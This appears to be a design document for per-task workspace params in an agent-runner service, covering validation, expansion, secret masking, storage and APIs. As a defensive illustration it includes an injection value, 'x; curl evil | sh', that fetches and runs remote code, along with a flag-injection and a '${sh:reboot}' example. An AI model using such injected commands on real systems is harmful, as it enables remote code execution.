---
title: "Task params and ${param:} in workspaces"
description: "The only per-task input is the instruction text, so a workspace can't hand its sandbox a structured per-task value such as the Jira key a process agent works on."
---

Issue: https://github.com/gritzapp/gritz/issues/2216

## Problem

A workspace that runs a user-supplied `process` agent (a one-shot CLI) needs a
per-task value, for example the Jira story key it works on, in an environment
variable such as `JIRA_KEY`.

The only per-task input today is the instruction text. A process agent sees it
only as the rendered prompt on stdin
([`ProcessAgent.Prompt`](https://github.com/gritzapp/gritz/blob/master/internal/runner/agent/process.go)),
so the CLI has to fish the value out of free text. The workspace's
`container.environment` and `secrets:` can't help either:
[`workspace.LoadConfig`](https://github.com/gritzapp/gritz/blob/master/internal/runner/workspace/workspace.go)
expands every `${env:}` and `${sh:}` once, when the runner starts, so every task
in a workspace sees the same values.

## Design

`CreateTask` gains `params map<string,string>`, stored on the task and fixed for
its life. A workspace declares the params it accepts and references them as
`${param:name}`, beside the existing `${env:}` and `${sh:}`:

```yaml
workspaces:
  jira-story:
    params:
      jira_key:
        description: Jira story to work on
        required: true
        pattern: '^[A-Z][A-Z0-9]+-[0-9]+$'
      dry_run:
        description: Set to "1" to skip writes
        default: "0"
    secrets:
      JIRA_TOKEN: ${env:JIRA_TOKEN}
    container:
      image: ghcr.io/acme/story-bot:latest
      environment:
        JIRA_KEY: ${param:jira_key}
        DRY_RUN: ${param:dry_run}
    commands:
      - story-bot fetch "$JIRA_KEY"
    agent:
      type: process
      process:
        command: [story-bot, run]
```

The sandbox gets `JIRA_KEY=PROJ-123` for a task created with
`params: {jira_key: PROJ-123}`.

### Declaring params

`Workspace` gains `Params map[string]ParamDef`. A param has:

- a name matching `^[a-z][a-z0-9_]{0,63}$`, the rule custom event types and
  attributes already use;
- `description`, shown in the UI, the CLI and MCP;
- `required`: a task without it is rejected;
- `default`: the value when the task doesn't set it. Only for a param that isn't
  required; setting both is a load error;
- `pattern`: an RE2 regexp the value must match (anchor it yourself). A
  `default` must match it.

Declaring is mandatory. A `${param:x}` with no `params.x` is a load error, and
`CreateTask` rejects a key the workspace doesn't declare. Declarations are what
let the server reject a bad call up front, let the web UI, CLI and MCP list the
inputs a workspace takes, and keep a typo in a routing rule from silently
producing an empty variable.

An optional param that the task doesn't set and that has no `default` expands
to the empty string, as `${env:}` does for an unset variable.

### Where `${param:}` may appear

Only in values of:

- `container.environment`
- `lambda_microvm.environment`
- `secrets`

A reference anywhere else is a load error naming the field. A value may mix
literals and references (`PROJ_URL: https://jira.example.com/browse/${param:jira_key}`).

Everything else is excluded on purpose:

- **`commands:`** run in the sandbox through `sh -c` (`Driver.setup`). A value
  substituted into the command string is parsed by that shell, so
  `jira_key: "x; curl evil | sh"` would run. A param in `commands:` is a load
  error; reference the environment variable instead (`"$JIRA_KEY"`), which the
  shell expands as data. That is the same rule `secrets:` already follows, and it
  keeps the logged command string free of values.
- **`agent.process.command`** is argv, not shell, but a value can still become a
  flag (`--config=/etc/...`). The process reads the environment variable.
- **`container.image` and `lambda_microvm.*`** are consumed on the runner host
  by the backend. A per-task image means a caller picks which code runs with the
  workspace's secrets.
- **`agent:`** (prompt, MCP servers, model, ...) and **`capabilities:`**: the
  prompt has instructions for per-task text, and the rest is privilege or
  validated structure. None of these has a use case yet.

### Expansion timing

Expansion splits into two passes over the same `${namespace:value}` syntax
([`internal/x/expandvar`](https://github.com/gritzapp/gritz/blob/master/internal/x/expandvar/expandvar.go)).

**At load** (`LoadConfig`), as today, with one change: `expandNode` tracks the
YAML path of each scalar. For `param`, the `ExpandFunc`:

- at an allowed path, returns the reference unchanged (`${param:jira_key}`) and
  records the name, so `Validate` can check it's declared;
- anywhere else, fails with `${param:jira_key} is not allowed in commands[0]`.

Two more load checks keep the second pass unambiguous:

- An `${env:}` or `${sh:}` whose value contains `${` is an error. The regexp
  stops at the first `}`, so `${sh:echo ${param:x}}` would otherwise run
  `echo ${param:x` on the runner host. Params can never reach `${sh:}`.
- An `${env:}` or `${sh:}` whose *result* contains `${` at an allowed path is an
  error, so text from the runner's environment can't masquerade as a param
  reference in the second pass.

After load, the only `${...}` left in the config is a declared `${param:}` in an
allowed field.

**`Validate`** runs on the config with the references still in place. None of
the fields it checks (`agent`, `capabilities`, the MCP servers) may hold one, and
the backend's `ValidateWorkspace` checks only `image` / `image_identifier`, which
can't either, so their behaviour is unchanged. It gains the declaration checks:
names, `required` with `default`, `pattern` compiles, `default` matches, every
reference declared.

**Per run**, `TaskManager.specs` calls `Workspace.WithParams(params)` after
`m.workspaces.Get` and before `ValidateWorkspace`. It returns a copy with the
three allowed maps expanded:

- one non-rescanning pass of `expandvar.Expand` with an `ExpandFunc` that knows
  only `param`; any other namespace panics, since load expanded them all;
- each value is substituted literally. The output is never scanned again, so a
  value of `${sh:reboot}` stays that text in an environment variable.

`specs` runs for every run of the task: the first start, a restart, and a
re-provision after the sandbox is gone. Params can't change after creation (no
`UpdateTask` field), so each run expands the same values. The workspace config
can change between runs (the runner restarts with a new `workspaces.yaml`), and
the run uses the current config, as it already does for `${env:}`.

`WithParams` returns an error, not a panic, for a missing required param, an
undeclared key or a pattern mismatch. This is reachable: `CreateTask` validated
against the registration at creation, but the runner may have restarted since
with a config that declares something new, and schedules and routing rules
create tasks without consulting the registration (below). `specs` fails, and
`TaskRunner` fails the run with the error on the task's timeline, as it does
today for an unknown workspace. The runner is the enforcement point; the
server's checks exist to reject a bad call early.

### Secrets

A param referenced under `secrets:` is a secret. The expanded value goes into
`backend.Spec.Secrets` and `RunSpec.secrets` like any other entry, so the
driver's `redact.Writer` masks it as `[gritz:masked NAME]` in the shipped log,
even where it also appears in an environment variable or command output. No
driver change is needed.

The runner also marks such a param `secret: true` in the declarations it
registers (it is derived from the references, not written by the operator). The
server uses that flag to keep the value out of its own responses:

- `Task.params` returns a secret param's value as `[gritz:masked jira_token]`.
- Schedules and routing rules can't set secret params; saving one is
  `invalid_argument`. Their templates are readable by anyone who can read the
  schedule or rule, and a value that is the same on every fire belongs in the
  workspace's own `secrets:`. A secret param is for a caller who has a
  per-task credential, through `CreateTask`, MCP, the CLI or the web UI.

### Who sets params

**`CreateTask`** validates `params` against the `(runner, workspace)`
registration it already checks with `HasWorkspace`. `invalid_argument` for an
undeclared key, a missing required param, a pattern mismatch, a value over 4 KiB
or containing NUL or invalid UTF-8, or more than 32 params. Defaults are not
stored; the runner applies them, so they follow the config. A draft takes its
params at creation like any other task.

**MCP `create_task`** (`internal/server/mcpserver`, so both the HTTP MCP server
and `gritz mcp`) gains a `params` object of strings. `list_workspaces` includes
each workspace's declarations.

**`gritz task create`** gains a repeatable `--param name=value`. `gritz
workspaces` lists each workspace's params.

**Web UI**: the new-task form shows one field per declared param of the selected
workspace: required ones marked, `pattern` as the input's pattern, secret ones
as password inputs. The task page lists the task's params.

**Schedules** gain `params` on `Schedule`, `CreateScheduleRequest` and
`UpdateScheduleRequest`, stored in a new `schedules.params` column and copied
onto each task by `Schedule.Task`. They are validated against the registration
on save. `scheduler.Fire` doesn't consult registrations today and doesn't start
to: a fire error aborts the whole tick, so a registration that changed since
the save must not wedge the scheduler. The task is created, and the runner fails
its run if the params no longer fit.

**Routing rules**: `CreateTaskAction` gains `params map<string,string>`, from
param name to a template. A template is a literal, or contains
`${details:KEY}` (a key of the event's `ExternalPayload.details`) or
`${attr:KEY}` (the first value of a routing attribute), expanded server-side in
`Router.create` in one literal, non-rescanning pass. A reference to a missing
key expands to the empty string, and an empty param counts as unset.
`SetRoutingRules` checks at save that every key is declared by the rule's
workspace, that every required param is mapped, that no secret param is set, and
that literal templates match their pattern. At route time, like the scheduler,
`Router.create` doesn't consult the registration; it applies only the
registration-free value limits (size, NUL, UTF-8), and a value that fails one
creates no task and is logged like any other `create` error. A value that
misses its `pattern` creates a task whose run fails with the reason on its
timeline, which is where the rule's owner looks.

An alerting system's custom event could then create a task with
`{"jira_key": "${details:issue}"}`.

#### Untrusted values

Custom events carry no actor, so only public rules match them, and a public rule
on a GitHub event acts on non-members too. Through those rules, whoever holds an
org API key for the custom-event webhook, or anyone who can comment on a public
repository, chooses param values. The design limits what they can do with one:

- a value only ever becomes the data of an environment variable in the sandbox.
  gritz never parses it on the runner host, never hands it to a shell as code,
  and never rescans it for `${...}`;
- only declared params can be set, and routing rules can't set secret ones;
- `pattern` lets the operator restrict the alphabet, and the docs recommend one
  for every param a public rule maps. The runner enforces it before the sandbox
  sees the value;
- the size and count limits apply.

The workspace's own code still has to treat a param as untrusted input, as it
treats the instruction text today.

### Storage

A new Postgres migration:

```sql
-- migrate:up
ALTER TABLE tasks ADD COLUMN params JSONB NOT NULL DEFAULT '{}';         -- {name: value}, as created
ALTER TABLE tasks ADD COLUMN secret_params TEXT[] NOT NULL DEFAULT '{}'; -- names masked in Task.params
ALTER TABLE workspaces ADD COLUMN params JSONB NOT NULL DEFAULT '[]';    -- [ParamDef], as registered
ALTER TABLE schedules ADD COLUMN params JSONB NOT NULL DEFAULT '{}';

-- migrate:down
ALTER TABLE schedules DROP COLUMN params;
ALTER TABLE workspaces DROP COLUMN params;
ALTER TABLE tasks DROP COLUMN secret_params;
ALTER TABLE tasks DROP COLUMN params;
```

`secret_params` is fixed at creation from the registration, so a later
registration can't unmask a stored value. It is empty for tasks from schedules
and routing rules, which can't set secret params. Routing rules live in the
`orgs.routing_rules` JSONB, so `CreateTaskAction.params` needs no migration.
The runner's SQLite store doesn't change.

### How the runner gets the params

Not through the event log. `CommandPayload` already repeats the task's
workspace, but command events are replicated to every runner in the org,
persisted in the runner's SQLite store and readable through the event APIs, which
is the wrong place for a secret param, and params never change, so they don't
belong in a per-command event. Instead the runner fetches them per run with a new
runner-scoped RPC, under the same permission as `CreateTaskToken`, called beside
it in `TaskManager.specs`. It returns the unmasked values.

### Proto

```proto
service GritzService {
  // Returns a task's params, unmasked, for the runner building its run.
  rpc GetTaskParams(GetTaskParamsRequest) returns (GetTaskParamsResponse);  // new
}

// ParamDef is a param a workspace accepts.
message ParamDef {                         // new
  string name = 1;
  string description = 2;
  bool required = 3;
  string default = 4;                      // Empty for none.
  string pattern = 5;                      // RE2; empty accepts any value.
  // Whether the workspace references the param under secrets:. Set by the
  // runner from the config.
  bool secret = 6;
}

message RegisteredWorkspace {
  // ...
  repeated ParamDef params = 5;            // new
}

message CreateTaskRequest {
  // ...
  // Values for the params the workspace declares, fixed for the task's life.
  map<string, string> params = 9;          // new
}

message Task {
  // ...
  // The params the task was created with. A secret param's value is
  // "[gritz:masked NAME]".
  map<string, string> params = 19;         // new
}

message CreateTaskAction {
  // ...
  // Param name to template: a literal with ${details:KEY} and ${attr:KEY}
  // references to the triggering event.
  map<string, string> params = 5;          // new
}

message Schedule { map<string, string> params = 17; }               // new
message CreateScheduleRequest { map<string, string> params = 10; }  // new
message UpdateScheduleRequest { map<string, string> params = 10; }  // new

message GetTaskParamsRequest { int64 task_id = 1; }                 // new
message GetTaskParamsResponse { map<string, string> params = 1; }   // new
```

### API

```go
package workspace // github.com/gritzapp/gritz/internal/runner/workspace

// ParamDef declares a param the workspace accepts.
type ParamDef struct { // new
	Description string `yaml:"description"`
	Required    bool   `yaml:"required"`
	Default     string `yaml:"default"`
	Pattern     string `yaml:"pattern"`
}

type Workspace struct {
	// ...
	// Params declares the params tasks in this workspace accept.
	Params map[string]ParamDef `yaml:"params,omitempty"` // new
}

// WithParams returns a copy of w with ${param:} references in its environment
// and secrets replaced by params, applying defaults.
func (w *Workspace) WithParams(params map[string]string) (*Workspace, error) // new

// SecretParams returns the names of the params w references under secrets.
func (w *Workspace) SecretParams() []string // new
```

```go
package expandvar // github.com/gritzapp/gritz/internal/x/expandvar

// Expand is unchanged: one pass, replacements are not rescanned. Both
// expansion passes and the router's template expansion rely on that.
func Expand(input string, replace func(namespace, value string) (string, error)) (string, error)
```

```go
package model // github.com/gritzapp/gritz/internal/model

type Task struct {
	// ...
	// Params are the values the task was created with.
	Params map[string]string // new
	// SecretParams names the params masked in the task's proto.
	SecretParams []string // new
}

type CreateTaskAction struct {
	// ...
	// Params maps a param name to its template.
	Params map[string]string // new
}

// ValidateParamValues checks the registration-free limits: count, size, NUL
// and UTF-8.
func ValidateParamValues(params map[string]string) error // new

// ValidateParams checks params against the workspace's registered defs, and
// the value limits.
func ValidateParams(defs []*gritzv1.ParamDef, params map[string]string) error // new
```

**How it fits:** the runner loads the config with `LoadConfig` and registers
each workspace's `Params` with `secret` from `SecretParams`. `CreateTask` and
the schedule and routing-rule save paths call `model.ValidateParams` against the
stored registration; `Router.create` calls `ValidateParamValues` on the expanded
templates. `TaskManager.specs` calls
`GetTaskParams`, then `ws.WithParams`, and passes the expanded copy to
`buildSpecs` and the backend.

### Relationship to gritzrpc

The open [gritzrpc proposal](https://github.com/gritzapp/gritz/pull/1945) gives
custom agents typed events on every wake. The two don't overlap: params are
start-time input, fixed for the task and delivered as environment, so any agent
type gets them, including today's `process`. gritzrpc's `run/start` carries what
happens later. A gritzrpc agent reads its params from the environment like any
other.

### Docs

- `operators/workspaces-yaml`: `params:`, `${param:}` and where it's allowed.
- `operators/secrets`: a param under `secrets:` is masked.
- `concepts/workspaces`, `concepts/tasks`: what params are.
- `concepts/schedules`, `concepts/routing-rules`: setting and mapping params.
- `integrations/custom-events`: mapping `details` into params, and the trust
  note for public rules.
- `integrations/mcp`: `create_task`'s `params`, `list_workspaces`'s defs.
- `reference/cli`, `using/cli`: `--param`, params in `gritz workspaces`.
- `using/web-ui`: the param fields on the new-task form and task page.
- `reference/api` picks up the proto comments.

## Implementation Plan

1. **Workspace params in config** — Delivers: `params:` declarations, `${param:}`
   retained at allowed paths and rejected elsewhere, the `${env:}`/`${sh:}`
   checks, `Validate`'s declaration checks, `WithParams`, `SecretParams`, and
   params in `gritz workspaces`; `operators/workspaces-yaml` docs. Nothing calls
   `WithParams` yet. Depends on: nothing. Verifiable by: `workspace` unit tests
   for load errors, mixed values, the non-rescan and the defaults.
2. **Schema migration** — Delivers: the four columns above. Depends on: nothing.
   Verifiable by: the migration running up and down.
3. **Registration and CreateTask** — Delivers: `ParamDef`,
   `RegisteredWorkspace.params` registered by the runner, `CreateTaskRequest.params`,
   `model.ValidateParams`, `tasks.params`/`secret_params`, masked `Task.params`,
   and `GetTaskParams`. Depends on: (1), (2). Verifiable by: apiserver tests for
   each rejection and the mask.
4. **Runner wire-up** — Delivers: `TaskManager.specs` fetching and expanding
   params. Depends on: (3). Verifiable by: an e2e test with a process agent that
   prints `$JIRA_KEY`, and a secret param shown masked in the shipped log; a
   restart sees the same value.
5. **CLI** — Delivers: `gritz task create --param`; CLI docs. Depends on: (3).
   Verifiable by: creating a task against the dev stack.
6. **MCP** — Delivers: `create_task`'s `params` and the defs in
   `list_workspaces`; MCP docs. Depends on: (3). Verifiable by: mcpserver tests.
7. **Web UI** — Delivers: param fields on the new-task form, params on the task
   page; web UI docs. Depends on: (3). Verifiable by: creating a task in the dev
   stack and seeing the variable in its sandbox.
8. **Schedules** — Delivers: `params` on schedules, validated on save and
   copied onto fired tasks; schedules docs. Depends on: (3). Verifiable by:
   scheduler tests firing a schedule with params, and a save rejected for an
   undeclared param.
9. **Routing rules** — Delivers: `CreateTaskAction.params`, template expansion
   in `Router.create`, save-time checks, the secret-param rejection; routing and
   custom-events docs. Depends on: (3). Verifiable by: `TestEvent` firing a
   custom event whose `details` land in the created task's params.

## Trade-offs

- **Undeclared params**, any key accepted and referenced freely, need no
  registration change, but a typo becomes a silently empty variable, nothing can
  render a form, and a public routing rule could set arbitrary keys. Declaring
  costs a few lines of YAML.
- **Params as environment variables automatically** (`GRITZ_PARAM_JIRA_KEY`)
  would skip `${param:}` entirely. It decides variable names for the operator,
  can't route a param into `secrets:`, and can't mix literals; the decided shape
  is `${param:}`.
- **Params in `commands:` with shell quoting** would make `story-bot fetch
  ${param:jira_key}` safe if gritz single-quoted the value. Quoting rules for
  `sh -c` are easy to get subtly wrong and the command line would then carry the
  value into the log; referencing the variable is already safe.
- **Params on `CommandPayload`** would save the RPC, but it puts secret values
  in a log replicated to every runner and readable through the event APIs, and
  repeats immutable data on every command.
- **A structured template type** (`[]part`) for allowed fields instead of
  leaving `${param:}` text in the strings would make the second pass parse-free,
  but it changes `Container.Environment` and `Secrets` from `map[string]string`
  for every backend. The two load-time checks give the same guarantee.

## Open Questions

- Should `get_my_task` and the rendered prompt show the task's non-secret params,
  so LLM agents see them too, or is the instruction text enough there?
- `${attr:KEY}` takes an attribute's first value. Should a multi-valued attribute
  instead fail the mapping?
- Is there a near-term need for params in `agent.mcp_servers.*.env` (for
  example a per-task MCP credential)? It would be the next field to allow.
